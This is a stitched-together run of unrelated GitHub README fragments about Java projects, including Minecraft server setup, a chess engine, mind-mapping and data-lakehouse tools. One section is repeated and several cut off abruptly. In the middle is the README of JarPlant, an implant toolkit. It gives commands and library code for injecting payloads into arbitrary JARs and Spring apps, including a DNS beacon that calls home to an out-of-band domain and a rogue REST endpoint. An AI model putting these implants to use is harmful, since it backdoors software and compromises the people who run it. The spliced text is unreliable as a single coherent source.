Obtain the latest version of the EaglerXBungee JAR file (it can be downloaded in the client from the ""Multiplayer"" screen) and place it in the ""plugins"" folder of your BungeeCord server. It's recommended to only join native Minecraft 1.8 servers through an EaglerXBungee server but plugins like ProtocolSupport have allowed some people to join newer servers too.

Configuration files and other plugin data will be written in `plugins/EaglercraftXBungee`

### Online Mode Instructions

1. Enable `online_mode` in BungeeCord's `config.yml` file and make sure it works
2. Join the BungeeCord server using Minecraft Java Edition while logged into your Microsoft account
3. Run the `/eagler` command, it will give you a temporary login code
4. Disconnect from the server, close java edition, launch EaglercraftX 1.8
5. Set your profile username to the username of your Microsoft account
6. Go to the ""Multiplayer"" menu, press ""Direct Connect"", press ""Connect to Server"", then enter ""ws://localhost:8081/""
7. If you are using a VPS, replace ""localhost"" with the IP address of the VPS when you connect
8. Press ""Join Server"", a login screen will be displayed, enter the temporary login code into the password field
9. EaglerXBungee will log you into the server as the Microsoft account you generated the login code with

Players using EaglercraftX will be able to see the vanilla skins of players on the server using vanilla Minecraft, but players on the server using vanilla Minecraft won't be able to see the skins of players using Eaglercraft. Instead they will see the skin of the Minecraft account that was used when the Eaglercraft player originally ran the `/eagler` command.

To disable this vanilla player skin feature and stop the plugin from downloading the textures of any player heads spawned with commands, edit the EaglercraftXBungee `settings.yml` file in the `plugins/EaglercraftXBungee` folder and change `download_vanilla_skins_to_clients` to `false`. Ratelimits configured in `settings.yml` define the maximum number of times per minute a single player is allowed to trigger profile/skin lookups and also define the maximum number of times per minute the entire server is allowed to actually perform profile/skin lookups.

By default, EaglercraftXBungee will use a local SQLite database in the server's working directory to store player skins and authentication codes. SQLite will be downloaded automatically if it is not already present. If you would like to use MySQL or something else instead, EaglercraftXBungee is JDBC-based and supports any database type that you can find a driver for. You can set the path of the database, path of the driver JAR, and the name of the driver class (example: `org.sqlite.JDBC`) for storing player skins in `settings.yml` and for storing login codes and profiles in `authservice.yml`.

### Offline Mode Instructions

By setting `online_mode` to `false` in the BungeeCord `config.yml` the authentication system will be disabled and players will no longer be required to first generate a code to log in. This should only be used for testing or if you can't get the authentication system to work. EaglercraftXBungee's skin system is supposed to be able to display SkinsRestorer skins if you plan to have vanilla players on the server but it's not guaranteed.

### Built-in HTTP server

When configuring the EaglercraftXBungee `listeners.yml` file, every listener includes an `http_server` section that can be used to configure the listener to also behave like a regular HTTP server when the websocket address is entered into a browser. If this is disabled people will get the normal ""404 Websocket Upgrade Failure"" instead when they accidentally type your server address into their browser. `root` defines the path to the folder containing index.html and the other files you want to host, relative to the `plugins/EaglercraftXBungee` folder. This can be useful for hosting the client if the offline download doesn't work for some reason but might slow your BungeeCord server down if lots of people are loading it all the time.

### Enabling Voice Chat

Voice chat is disabled by default in EaglercraftXBungee because it is not recommended for use on public servers. To enable it, add or change `allow_voice: true` to your EaglercraftXBungee `listeners.yml` file. The main difference between Eaglercraft 1.5.2 and EaglercraftX 1.8's voice chat feature is that the ""Global"" channel now only includes other players on the same server as you instead of every single player connected to the same bungeecord proxy. If you would like to disable voice chat on certain servers, add the names of the servers to the `disable_voice_chat_on_servers` list in the EaglercraftXBungee `settings.yml` file. You may have to add this property to the YML file manually if you've upgraded your server from an older version of EaglercraftXBungee.

### Disabling FNAW Skins

Players are known to complain about the high-poly Five Nights At Winstons character skins making PVP harder because of the belief that they change a player's hitbox. If you would like to disable those skins in your PVP worlds you can either set `disable_fnaw_skins_everywhere: true` in your EaglercraftXBungee `settings.yml` file to disable them for all players on your whole BungeeCord proxy, or you can disable them on specific servers by adding the names of the servers to the `disable_fnaw_skins_on_servers` list also in `settings.yml` like with disabling voice chat.

## Launch Options

The EaglercraftX 1.8 client is configured primarily through a variable called `window.eaglercraftXOpts` that must be set before the client starts up.

The default eaglercraftXOpts values is this:

    const relayId = Math.floor(Math.random() * 3);
    window.eaglercraftXOpts = {
        demoMode: false,
        container: ""game_frame"",
        assetsURI: ""assets.epk"",
        localesURI: ""lang/"",
        worldsDB: ""worlds"",
        servers: [
            { addr: ""ws://localhost:8081/"", name: ""Local test server"" }
        ],
        relays: [
            { addr: ""wss://relay.deev.is/"", comment: ""lax1dude relay #1"", primary: relayId == 0 },
            { addr: ""wss://relay.lax1dude.net/"", comment: ""lax1dude relay #2"", primary: relayId == 1 },
            { addr: ""wss://relay.shhnowisnottheti.me/"", comment: ""ayunami relay #1"", primary: relayId == 2 }
        ]
    };

### Using Hooks

You may want to implement some custom logic for loading/saving certain local storage keys. The eaglercraftXOpts hooks section can be used to override the client's local storage load and save functions. Currently, local storage keys are used to save game settings, the user's profile, custom servers, and shared world relays. Worlds and resource packs do not use local storage keys because modern browsers limit local storage keys to only 5 megabytes per domain which is too small for saving entire worlds and resource packs. Worlds and resource packs are saved using [IndexedDB](https://developer.mozilla.org/en-US/docs/Web/API/IndexedDB_API).

    window.eaglercraftXOpts = {
        ...
        ...
        ...
        hooks: {
            localStorageSaved: function(key, data) {
                // 'key' is local storage key name as a string
                // 'data' is base64-encoded byte array as a string
                // function returns nothing
            },
            localStorageLoaded: function(key) {
                // 'key' is local storage key name as a string
                // function returns a base64-encoded byte array as a string
                // function returns null if the key does not exist
            }
        }
    }

Be aware that the client will still save the key to the browser's local storage anyway even if you define a custom save handler, and will just attempt to load the key from the browser's local storage normally if you return null, these are meant to be used like event handlers for creating backups of keys instead of completely replacing the local storage save and load functions.

On a normal client you will only ever need to handle local storage keys called `p` (profile), `g` (game settings), `s` (server list), `r` (shared world relays), in your hooks functions. Feel free to just ignore any other keys. It is guaranteed that the data the client stores will always be valid base64, so it is best practice to decode it to raw binary first if possible to reduce it's size before saving it to something like a MySQL database in your backend if you are trying to implement some kind of profile syncing system for your website. The keys already have GZIP compression applied to them by default so don't bother trying to compress them yourself a second time because it won't reduce their size.

## Developing a Client

There is currently no system in place to make forks of 1.8 and merge commits made to the patch files in this repository with the patch files or workspace of the fork, you're on your own if you try to keep a fork of this repo for reasons other than to contribute to it

A javascript-based modding API resembling Minecraft Forge may be implemented someday though for adding custom content to the game.

LekKit/ScalarEvolution,1.7.10,"# Scalar Evolution

An obscure Minecraft mod about computer technology and electronics based on [RVVM](https://github.com/LekKit/RVVM)

![image](https://github.com/user-attachments/assets/37773cd8-6917-41ad-a803-d904f169ab87)

# Pre-alpha quality - here be dragons

If you want to help:

- See issues
- Propose new ideas in [#3](https://github.com/LekKit/ScalarEvolution/issues/3)
- Try to overhaul models/textures as you see fit, those are not in the best shape. Be aware that it might be rejected too.
- Consider contributing to [RVVM](https://github.com/LekKit/RVVM)

Currently targeted at Minecraft 1.7.10. It might eventually get ported to 1.12.2 and 1.16.5+.

## Building
```shell
$ ./gradlew build
```

## Is this an OC2 ripoff?

**No.** The idea to make this mod came much earlier, but took a lot of time to bring it to working state.\
It was originally inspired by the long-forgotten OCMIPS. and lunatic86 projects. Then OC2 project was kind of a simultaneous invention.

When I saw the OC2 project I originally wanted to propose RVVM to them for performance reasons, but RVVM wasn't even as advanced back then to propose anything.\
I decided to continue working on my mod instead of giving up, since it still has many different goals.

    Java archive implant toolkit   v0.1   by w1th4d & kugg

positional arguments:
  command
    class-injector       Inject a class implant  into  any JAR. The implant
                         will detonate whenever  any  class  in  the JAR is
                         used but  the  payload  will  only  run  once  (or
                         possibly twice in  some  very  fringe cases). This
                         is the most versatile implant  type and works with
                         any JAR (even ones  without  a main function, like
                         a library).
    spring-injector      Inject  a  Spring  component   implant  into  JAR-
                         packaged Spring  application.  The  component will
                         be loaded and included in  the Spring context. The
                         component could be  something  like  an extra REST
                         controller or scheduled task.
    implant-list         List all bundled implants.
    implant-info         See more details  about  a  specific implant. This
                         includes reading its  class  to  see all available
                         configuration properties and  their  data types. A
                         class file path can be  specified to read a custom
                         implant.
    decoder              Utility to decode stuff  generated  by some of the
                         built-in payloads.

named arguments:
  -h, --help             show this help message and exit

for more options, see command help pages:
  $ java -jar jarplant.jar class-injector -h
  $ java -jar jarplant.jar spring-injector -h
    ...

example usage:
  $ java -jar jarplant.jar class-injector \
    --target path/to/target.jar --output spiked-target.jar
```

## Quick grabs

These are some examples of things you may be interested in.

Spike any Java app or library to call home to an out-of-band DNS catcher (like Interactch or Burp Collaborator):

```shell
java -jar jarplant.jar class-injector \
   --target path/to/target.jar \
   --implant DnsBeaconImplant \
   --config CONF_DOMAIN=$YOUR_OAST_DOMAIN 
```

Replace `$YOUR_OAST_DOMAIN` with your `*.oast.fun` domain (or whatever out-of-band service you use).

Decode the domain name caught by your DNS server:

```shell
java -jar jarplant.jar decoder $ENCODED_FQDN 
```

Replace `$ENCODED_FQDN` with the domain name in the DNS query.

Spike a Spring Boot app to include a rogue REST endpoint:

```shell
java -jar jarplant.jar spring-injector \
   --target path/to/target.jar \
   --implant-component SpringImplantController \
   --implant-config SpringImplantConfiguration 
````

You'll want to modify `StringImplantController.java` for this one do to anything interesting.
The default is to create a REST controller routed to `/implant` that just gives a dummy response.

Spike any JAR with your own custom implant code:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant 
```

Where your custom implant code resides in the `payload()` method of `ClassImplant.java`.

Spike any JAR with an implant that will always finish no matter what:

```shell
java -jar class-injector \
   --target path/to/target.jar \
   --implant ClassImplant
   --config CONF_BLOCK_JVM_SHUTDOWN=true 
```

Be careful with blocking operations in your payload code.

## Configuration

JarPlant supports injection of custom values with the implants.
A set of common configuration properties are defined with the template and built-in implants.
These are:

| Configuration property    | Data type | Description                                                                                                    | Default value     |
|---------------------------|-----------|----------------------------------------------------------------------------------------------------------------|-------------------|
| `CONF_JVM_MARKER_PROP`    | String    | JVM system property to create and use as a ""marker"" to determine if an implant has been detonated in this JVM. | `java.class.init` |
| `CONF_BLOCK_JVM_SHUTDOWN` | boolean   | Controls whether the implant's thread will block the JVM from fully exiting until the implant is done.         | `false`           |
| `CONF_DELAY_MS`           | int       | Optional delay (in milliseconds) before the implant payload will detonate.                                     | `0`               |

See the `ClassImplant` template Javadoc for mor info in these properties.

### Blocking the JVM exit

Be extra careful with the `CONF_BLOCK_JVM_SHUTDOWN` property.
If this is set to `true`, then the JVM will wait for your payload to finish its execution.
If your payload takes a long time, then the spiked app will fail to exit properly.
It's _not_ recommended to set a non-zero `CONF_DELAY_MS` value together with `CONF_BLOCK_JVM_SHUTDOWN=true`.

If you've injected an implant into an app that exits very quickly, then your payload may not get enough time to execute
if `CONF_BLOCK_JVM_SHUTDOWN` is set to `false` (which is the default setting).

As a general rule of thumb, only set `CONF_BLOCK_JVM_SHUTDOWN` to `true` if your implant is quick to execute and/or it's
absolutely essential that it _must_ finish.

For any target apps that takes some time to run (like a back-end service), there should be plenty time for your implant
to do its thing with `CONF_BLOCK_JVM_SHUTDOWN` set to its default value of `false`.

## Quickly implement a custom implant

For a one-off in a rush, the simplest and fastest way of getting your own custom Java code into a target JAR is to:

1) Clone this code repository.
2) Modify the `payload()` method inside `ClassImplant.java` with your own code.
3) Build JarPlant: `mvn clean package`.
4) Run the CLI. See the ""Quick grabs"" section above.

Alternatively, if you're spiking a Spring app: Modify the `SpringComponentImplant.java` (and maybe the
`SpringConfigurationImplant.java`) and use the `spring-injector` CLI accordingly.

## Using the JarPlant library

To invoke JarPlant from your own Java code, first run `mvn clean install` in the root directory of the JarPlant code
repository.
Then, include it in the `pom.xml` (or equivalent) of your own project:

```xml
<dependency>
  <groupId>io.github.w1th4d.jarplant</groupId>
  <artifactId>jarplant-lib</artifactId>
  <version>1.0-SNAPSHOT</version>
</dependency>
```

These coordinates _will be changed_ soon. It will also be published to Maven Central when it's properly released.

Example usage in your code:

```java
public class Demo {
    public static void main(String[] args) {
        try {
            ImplantHandler implant = ImplantHandlerImpl.findAndCreateFor(ClassImplant.class);
            implant.setConfig(""CONF_BLOCK_JVM_SHUTDOWN"", true);

            Path target = Path.of(""target.jar"");
            JarFiddler jar = JarFiddler.buffer(target);

            Injector injector = ClassInjector.createLoadedWith(implant);
            boolean succeeded = injector.injectInto(jar);
            if (succeeded) {
                jar.write(target);
            }
        } catch (ClassNotFoundException | IOException | ImplantException |
                 ImplantConfigException e) {
            throw new RuntimeException(e);
        }
    }
}
```

You may want to include the `jarplant-implants` submodule for access to `ClassImplant`:

```xml
<dependency>
  <groupId>io.github.w1th4d.jarplant</groupId>
    <artifactId>jarplant-implants</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

However, if you write your own code like this, it would be better to copy the `ClassImplant` template into your own
project and customize it according to your needs.
Give it a cool name while you're at it.

You may also introduce new configuration properties. Just make sure they're `public`, `static`, `volatile` and has a
name prefixed with `CONF_`.
If no default value is used for a property, then a value must be provided using `ImplantHandler.setConfig()` before
injection.

## Library components

JarPlant is written as a Java library and framework for you to write your own implants.

There are a number of key components to JarPlant. These are `ImplantHandler`, `JarFiddler` and `Injector`.

### ImplantHandler

This class (its implementation `ImplantHandlerImpl`) is used to find, load and configure implants.

This API is subject to change soon.

### JarFiddler

This class is used to read, modify and write a JAR file.

The default implementation will read and buffer the contents of an entire JAR into memory.
The injectors can then operate upon the `JarFiddler` in-memory.
The user of the JarPlant API is expected to invoke the `write()` method if the injector succeeds.

### Injectors

These are the classes that does most of the bytecode manipulation of classes inside a JAR.

There are different implementations for various types of JARs/apps: `ClassInjector` and `SpringInjector`.

#### ClassInjector

Operates upon any JAR file containing arbitrary classes.
The JAR does _not_ have to be executable or contain a class with a `public static void main(String[] args)` function.
Any class will do. This works for libraries and dependencies, too.

When the target JAR is run or used by another app, the implant will trigger.

#### SpringInjector

Specifically looks for a Spring configuration classes and injects a Spring component in the same package namespace.
If _component scanning_ is not enabled by the target app, then the SpringInjector will also inject a `@Bean`-annotated
method in the configuration in order to reference the implanted component.

The Spring implant template will register a new HTTP request mapping for the app.
Requests going to that endpoint (`/implant` by default) will be handled by the implant.
You're encouraged to modify `SpringComponentImplant.java` with your own custom code.

## Implants

JarPlant is intended to serve as a framework for developers to implement their own implants.

The template for the `ClassInjector` is `ClassImplant`.
Please delve into it, read its Javadoc and fill in the `payload()` method appropriately.

The `SpringInjector` uses two different implants: A _Spring component_ implant and a _Spring configuration_ implant.
Both needs to be supplied and maintained, but the `SpringInjector` may skip the Spring configuration implant if it's not
necessary.
Future versions may (hopefully) be able to generate the Spring configuration implant during injection, but it needs to
be supplied explicitly for now.

## Maven modules

This project is divided into a set of Maven modules:

* **jarplant-cli** is where the executable main function is. It gives the user a Command Line Interface to use the
  JarPlant functionality in a user-friendly way.
* **jarplant-implants** is where the various example implants are located. A savvy user is encouraged to write custom
  implants as appropriate.
* **jarplant-lib** is where the main functionality is. This module is designed to contain only the essential
  functionality for portability.
* **test-app-pojo** is a very minimal plain Java app that can be used for test the class implants.
* **test-app-spring-simple** is a simple Spring Boot application for testing the Spring implants.
  It's just a `@SpringBootApplication` with one configuration and controller.
* **test-app-spring-complex** tries to simulate a more intricate Spring app with several `@Configuration` classes in
  different sub-packages. It includes configurations without component scanning enabled, several configurations in
  the same package and other exotic cases worth testing for.
* **test-implant-class** and **test-implant-spring** are used internally for tests.

## Test suite

Testing JAR and bytecode manipulation can be a bit tricky. Please try to include any bug or corner case into its own
Junit test. Don't be afraid of adding to the test apps and test implants, just don't break any other tests in the
process. Add a new submodule with a test app/implant that narrows in on the test case if necessary. *Don't* check in
a blob like a JAR file or anything. Any test apps needs to be provided by source and pom. Try to keep it to the point.

### Test automation

Most tests reside in `jarplant-lib/src/test` that houses a mix of unit tests and end-to-end tests.
The tests use a combination of dummy classes and ""live samples"" from the other Maven submodules.
These submodules are set up to build a proper JAR file and then copy it into the resource folder of the tests.
See their `pom.xml` files for details. It's a bit out of the ordinary and may generate some warnings in Maven.  
Just make sure to run `mvn package` in the project root before running any tests in isolation.

The tests in `jarplant-lib` are a mix of unit tests and end-to-end tests.

### Manual testing and troubleshooting

When developing JarPlant or its implants, it's been very useful to use the `javap` tool provided with the JVM.

Example:

```
mkdir /tmp/jarplant-debug
cd /tmp/jarplant-debug
unzip ../path/to/jarfile/my-app.jar

javap -c -v io/github/w1th4d/jarplant/test/Main.class | less
```

Replace directories and paths as appropriate. The key here is the `javap` command. It's great for disassembling and
peaking into the JVM bytecode. Do this before and after a JarPlant run and investigate the diffs.

Consider to use the manual testing procedure as a tool to narrow down on a bug and then express that bug as a Junit
test. That way, it's easy for someone to fix the bug by satisfying the test. Alternatively, just fix the bug and create
a PL. You can always just create a GitHub Issue to explain the problem if you're unable to express it as a test or fix
it yourself. A reported Issue is better than nothing.

## Future work

There's a lot of work that still needs to be done. See the Issues section on GitHub for more details.

One key point about future work is that *a lot* more testing needs to be done.
We know that JarPlant in its current state will fail to spike many JARs in the wild.
We're also concerned about compatibility between different Java versions.
All of this needs to be set up with test automation.

  # Serendipity

</div>

Serendipity is a UCI chess engine written in the Java programming language. With a CCRL rating of more than 3500 elo, it is the strongest Java chess engine in the world.

### History

In early January 2024, I was inspired by a [tom7 video][elo_world] to create a [chess arena][chess_arena] in Java.
It didn't get very far, however, as I soon focused all my development effort in a minimax implementation.

In March, I began to work on NNUE support.
After completing NNUE, the strength of Serendipity skyrocketed, I had several commits with gains of over 100 Elo.
On March 27, I published my [first release][first_release]. The results were much better than I had expected, as it turns out that I have
vastly underestimated Serendipity's strength. Two days later, I made my first Stockfish commit.

In May, four other engine developers and I co-founded an [OpenBench][openbench_url] instance, where Serendipity testing happens to this day.

In August, I implemented multithreading for Serendipity's first debut Top Chess Engines Championship.

#### Timeline

- January 9, 2024: First commit to arena project
- January 12, 2024: First main repo commit
- March 10, 2024: NNUE support
- March 27, 2024: First release of Serendipity
- May 24, 2024: OpenBench instance founded
- August 23, 2024: Multithreading support
- August 26, 2024: TCEC Debut

### Strength

As of November 2024, Serendipity is the strongest Java engine in the world and around top 50 overall.

</div>

### Build

To build Serendipity from source, install [`maven`][maven_url], [`make`][make_url], [`git`][git_url] and [`wget`][wget_url]. Then run the following:

```bash
git clone git@github.com:xu-shawn/Serendipity.git
cd Serendipity
make
```

This will produce two versions of Serendipity executable: `Serendipity-Dev` and `Serendipity.jar`.

`Serendipity-Dev` is a standalone executable that can be run on Linux or MacOS directly.

`Serendipity.jar` is cross platform, but it requires extra commands to run. See section below for more details.

### Run

Serendipity only supports Java version 17 or higher due to its dependency on Java's (incubating) [Vector API][vector_api]. To run `Serendipity.jar`:

```
java -jar --add-modules jdk.incubator.vector Serendipity.jar
```

Alternatively, if you are on Linux/MacOS, you can also opt to run the Serendipity executable file:

```
./Serendipity
```

### Evaluation

Serendipity relies on a side-relative and efficiently updatable neural network for evaluation.
This allows the network to be efficently updated between moves, which helps the engine obtain good evaluation with reasonable speed.

The description of the network architecture, as well as the training procedure, is beyond the scope of this document.

### Acknowledgements

The following section describes the steps to check out, compile, and start WiseMapping locally. If you are interested in deploying it, I recommend using the already published images https://hub.docker.com/r/wisemapping/wisemapping.

## Prerequisites

    * JDK 21 or higher
    * Maven v3.x or higher ([http://maven.apache.org/])
    * Yarn v1 or higher
    * Node v18 or higher

## Option 1: Quick Start with Docker Compose

The following command line will start WiseMapping locally using HSQLDB in memory for development purposes:

```
$ mvn -f wise-api/pom.xml package
$ docker compose up --build
```

Application will start at http://localhost/c/login. You can login using *test@wisemapping.org* and password *test*

## Option 2: Start Frontend and Backend API

### Compile and Start API

```
$ mvn -f wise-api/pom.xml package
$ cd wise-api
$ mvn spring-boot:run
```

### Compile and Start Frontend

You need to checkout https://github.com/wisemapping/wisemapping-frontend first. Then, follow the next steps:

```
$ export NODE_OPTIONS=--openssl-legacy-provider
$ export APP_CONFIG_TYPE=""file:dev""

$ cd wisemapping-frontend
$ yarn install 
$ yarn build

$ cd packages/webapp; yarn start
```
Application will start at http://localhost:3000/c/login. You can login using *test@wisemapping.org* and password *test*

# Supportability Matrix

## Databases

* MySQL v8 or higher
* PostgreSQL v15 or higher
* Hsqldb v2.7 or higher

# Configuration

WiseMapping backend is based on SpringBoot v3 and it's highly customizable. Additional documentation can be found [here](https://docs.spring.io/spring-boot/3.3/reference/features/external-config.html)

The perfered option is to extended by overwriting [application.yaml](https://github.com/wisemapping/wisemapping-open-source/blob/develop/wise-api/src/main/resources/application.yml)

```
$ java -jar target/wisemapping-api.jar --spring.config.additional-location=../../wise-conf/app.yml
```

For example, this [example](https://github.com/wisemapping/wisemapping-open-source/blob/develop/config/database/postgresql/app-postgresql.yaml) configure PostgreSQL as database.

# xtrspc: Android APK Comparison Tool

xtrspc is an APK designed for comparing two Android APK files. It decomposes the APKs, identifies added, removed, modified, and unchanged files, generates a detailed comparison result, and extracts relevant data into separate ZIP files. This tool aids in understanding the differences between two APKs and can be useful for version control or security analysis.

**Usage:**  
Fill the first EditText with Original APK path  
Fill the second EditText with Modified APK path  

Output the comparison result:  
/sdcard/data/xtrspc  

**Features:**
- Decompile APKs using apktool  
- Identify added, removed, modified, and unchanged files  
- Generate a detailed comparison result in a text file  
- Extract and compress important data based on the comparison result  

**Note:**  
Remember to grant all required permission.  
If somehow it keeps resulting an error saying some command (example: apktool) is not exists, you could try to input this command ```!reinstall``` on the first EditText and press the **COMPARE APK** button.

<h1>No Redraw</h1>
NoReDraw is a handy command line java-based tool that converts your source code into diagram<br/><br/>
Have you ever wondered about adding a nice diagram for your architecture? Have you ever had time for that? Are you up for maintaining the diagram for eternity?

No worries, I've got your back. Just run _NoReDraw_ tool against your repo and it will generate diagram of desired type. All local, no internet, no fancy AIs. 

```bash
wget https://github.com/uladzimirFilipchanka/noredraw/raw/main/noredraw.sh && chmod +x noredraw.sh

./noredraw.sh \
--source https://github.com/uladzimirFilipchanka/noredraw-sample.git \
--export MERMAID \
--output ./my-shiny-diagram.txt
```

Now you can insert generated diagram into your comapny's wiki and it will get rendered as an image ([GitHub](https://github.blog/2022-02-14-include-diagrams-markdown-files-mermaid/), [Confluence](https://marketplace.atlassian.com/apps/1222572/mermaid-charts-diagrams-for-confluence?tab=overview&hosting=cloud) and many more support it).

Alternatively NoReDraw can generate good old PNG for you by specifying `--export PNG` (internet connection required)

<h2>Export Formats</h2>
Currently next export formats are supported: 

* PNG
* [Mermaid](https://mermaid.js.org/)
* [Plant UML](https://plantuml.com/) 
* [DOT](https://graphviz.org/doc/info/lang.html)

You can always implement your own Exporter and use it right away. See **Customization** for more details
<h2>Supported providers</h2>

NoReDraw delegates creating of resources to Providers. Providers yield lists of resources, typically generated by parsing specific file types (Dockerfiles, *.tf, etc). These resources then undergo **linking** and **merging** stages.

Currently next providers are supported out of the box: 

* Gradle (basic Jars)
* Docker (parses Dockerfile)
* Terraform AWS (`aws_ecs_service` and `app_service` are supported)
* GitHub Actions ([Docker Build Push Actions](https://github.com/docker/build-push-action) and [AWS ECS Deploy Actions](https://github.com/aws-actions/amazon-ecs-deploy-task-definition))

> **New providers are highly encouraged!** The project is currently in PoC and active development stages, feel free to contribute! 

Alternatively, you can implement your own provider and use it right away. See **Customization** for more details

<h2>Input sources</h2>
You can use the `--source` parameter with either an URL to a public repository or a path pointing to the repo's directory. Private repositories aren't supported right now.

<h2>Customization</h2>
NoReDraw is exteremely simple and highly customizable by design. You can implement your own pieces of the tool, pack them in Jar and use with NoReDraw. 

You can write your own `Provider`, `Exporter`, `MergeStrategy` or `LinkStrategy` in a minutes.<br/>

1. Import `noredraw-core` into your project
```gradle
dependencies {
    implementation 'io.github.uladzimirfilipchanka:noredraw-core:0.0.1'
}
```
2. Implement an interface, for example `LinkStrategy`
```java
@Named(""MY_LINKING_STRATEGY"")
public class MyCustomMatchLinkStrategy implements LinkStrategy {
    @Override
    public boolean linkable(Relic left, Relic right) {
      return left.getName().equals(right.getName());
    }
}
```
3. Build a Jar, put it under `custom` folder next to `noredraw.jar`.
4. Run `./noredraw` specifying `--link MY_LINKING_STRATEGY`
5. Enjoy

You can find example of the custom prover in [noredraw-custom-example module](https://github.com/uladzimirFilipchanka/noredraw/tree/main/noredraw-custom-example)

## Launch Options

The EaglercraftX 1.8 client is configured primarily through a variable called `window.eaglercraftXOpts` that must be set before the client starts up.

The default eaglercraftXOpts values are this:

    const relayId = Math.floor(Math.random() * 3);
    window.eaglercraftXOpts = {
        demoMode: false,
        container: ""game_frame"",
        assetsURI: ""assets.epk"",
        localesURI: ""lang/"",
        worldsDB: ""worlds"",
        servers: [
            { addr: ""ws://localhost:8081/"", name: ""Local test server"" }
        ],
        relays: [
            { addr: ""wss://relay.deev.is/"", comment: ""lax1dude relay #1"", primary: relayId == 0 },
            { addr: ""wss://relay.lax1dude.net/"", comment: ""lax1dude relay #2"", primary: relayId == 1 },
            { addr: ""wss://relay.shhnowisnottheti.me/"", comment: ""ayunami relay #1"", primary: relayId == 2 }
        ]
    };

habuma/spring-ai-rag-example,main,"Spring AI RAG Example
---
Simple example to load the entire text of a document into a vector store and
then expose an API through which questions can be asked about the document's
content.

> IMPORTANT: This project has been copied into the
[Spring AI Examples repository](https://github.com/habuma/spring-ai-examples) and will no longer be maintained here.
I'm keeping it here for now, but for future updates, see
the Spring AI Examples repository.

Before running the application, you'll need to acquire an OpenAI API key.
Set the API key as an environment variable named `OPENAI_API_KEY`. E.g.,

```
$ export OPENAI_API_KEY=sk-1234567890abcdef1234567890abcdef
```

You'll also need a document for it to load. Set the `app.resource` property
in src/main/resources/application.properties to the resource URL of the
document. It is set to load the Wikipedia page for the game of Chess, but
you can change it to something else. For example:

```
app.resource=file:///Users/someuser/Spring_in_Action_SixthEdition.pdf
```

The resource URL can be a file, classpath, or even an HTTP URL. The file
itself can be any document type supported by Apache Tika, including PDF,
Word, HTML, and more.

Then run the application as you would any Spring Boot application. For
example, using Maven:

```
$ mvn spring-boot:run
```

The first time you run it, it will take a little while to load the document into
the vector store (which will be persisted at /tmp/vectorstore.json). Subsequent
runs will just use the persisted vector store and not try to load the document again.
(This means that if you change the document resource, you'll need to delete
/tmp/vectorstore.json so that it will be reloaded.)

Then you can use `curl` to ask questions:

```
$ curl localhost:8080/ask -H""Content-type: application/json"" -d '{""question"": ""What annotation should I use to create a REST controller?""}'
```

> The question shown in the example was used to ask questions against my book,
[Spring in Action, 6th Edition](https://www.manning.com/books/spring-in-action-sixth-edition?a_aid=habuma&a_bid=f205d999&chan=habuma).
You'll want to ask questions relevant to whatever document you're using.

Or with HTTPie it's a little easier:

```
http :8080/ask question=""What annotation should I use to create a REST controller?""
```

1. Crop a frame and return its base64 or path.
      
    ```js
    import { crop } from 'vision-camera-cropper';

    // ...
    const frameProcessor = useFrameProcessor((frame) => {
      'worklet';
      //coordinates in percentage
      const cropRegion = {
        left:10,
        top:10,
        width:80,
        height:30
      }
      const result = crop(frame,{cropRegion:cropRegion,includeImageBase64:true,saveAsFile:false});
      console.log(result.base64);
    }, []);
    ```

2. Rotate an image.

    ```js
    const rotated = await rotateImage(base64,degree);
    ```

## Get Bitmap/UIImage via Reflection

If you are developing a plugin to get the camera frames, you can use reflection to get it as Bitmap or UIImage on the native side.

Java:

```java
Class cls = Class.forName(""com.visioncameracropper.CropperFrameProcessorPlugin"");
Method m = cls.getMethod(""getBitmap"",null);
Bitmap bitmap = (Bitmap) m.invoke(null, null);
```


Objective-C:

```objc
- (UIImage*)getUIImage{
    UIImage *image = ((UIImage* (*)(id, SEL))objc_msgSend)(objc_getClass(""CropperFrameProcessorPlugin""), sel_registerName(""getBitmap""));
    return image;
}
```

You have to pass `{saveBitmap: true}` for the `crop` function.

### Starting the application
Requirements:
```
java: 21
node: 20
docker
```

#### Spin up the database container and setup mock users
```bash
cd ./scripts
./docker.sh
```

#### Run the spring boot app
`cd` back to the project root
```bash
mvn clean install
java -jar ./target/satchat-0.0.1-SNAPSHOT.jar
```

#### Start the front end
Open a new terminal from the project root and run:
```bash
cd ./satchat-ui
npm install
npm run start
```
open localhost:3000

If you see an error like `Unexpected end of JSON input` that means you dont have any mock users in your database yet.

Set them up using the script `setup-users.sh`:
```bash
cd ./scripts
./setup-users.sh
```

OpenHouse is an open source control plane designed for efficient management of tables within open data lakehouse
deployments. The control plane comprises a **declarative catalog** and a suite of **data services**. Users can
seamlessly define Tables, their schemas, and associated metadata declaratively within the catalog.
OpenHouse reconciles the observed state of Tables with the desired state by orchestrating various
data services.

## Getting Started

### Prerequisites

For building and running locally in [Docker Compose](SETUP.md), you would need the following:

- [Java](https://www.oracle.com/java/technologies/downloads/)
  - OpenHouse is currently built with Java 17.
  - Set the `JAVA_HOME` environment variable to the location of your JDK17.
- [Docker](https://www.docker.com/)
- [Docker Compose](https://docs.docker.com/compose/)
- [Python3](https://www.python.org/downloads/)

For deploying OpenHouse to [Kubernetes](DEPLOY.md), you would need the following:
- [Helm](https://helm.sh/docs/intro/install/)
- [Kubernetes](https://kubernetes.io/docs/setup/)

### Building OpenHouse

To build OpenHouse, you can use the following command:
```bash
./gradlew build
```

### Running OpenHouse with Docker Compose

To run OpenHouse, we recommend the [SETUP](SETUP.md) guide. You would bring up all the OpenHouse services, MySQL,
Prometheus, Apache Spark and HDFS.

### Deploying OpenHouse to Kubernetes

To deploy OpenHouse to Kubernetes, you can use the [DEPLOY](DEPLOY.md) guide. You would build the container images for
all the OpenHouse services, and deploy them to a Kubernetes cluster using Helm.

### Compability Matrix

OpenHouse is built with the following versions of the open-source projects:

| Project | Version |
| --- | --- |
| [Apache Iceberg](https://iceberg.apache.org/releases/#120-release) | 1.2.0 |
| [Apache Spark](https://spark.apache.org/releases/) | 3.1.2 |
| [Apache Livy](https://livy.apache.org/) | 0.7.0-incubating |
| [Apache Hadoop Client](https://hadoop.apache.org/releases.html) | 2.10.0 |
| [Springboot Framework](https://spring.io/projects/spring-boot) | 2.6.6 |
| [OpenAPI](https://swagger.io/specification/) | 3.0.3 |

## Usage

To start an application you need to pass variables to `.env` file. Look
at `.env.example` file with some predefined environments.

All services are running in docker containers. To start the application
you need to run `docker-compose up -d` command.

**NOTE**: after Debezium connect is started, apply source config manually.

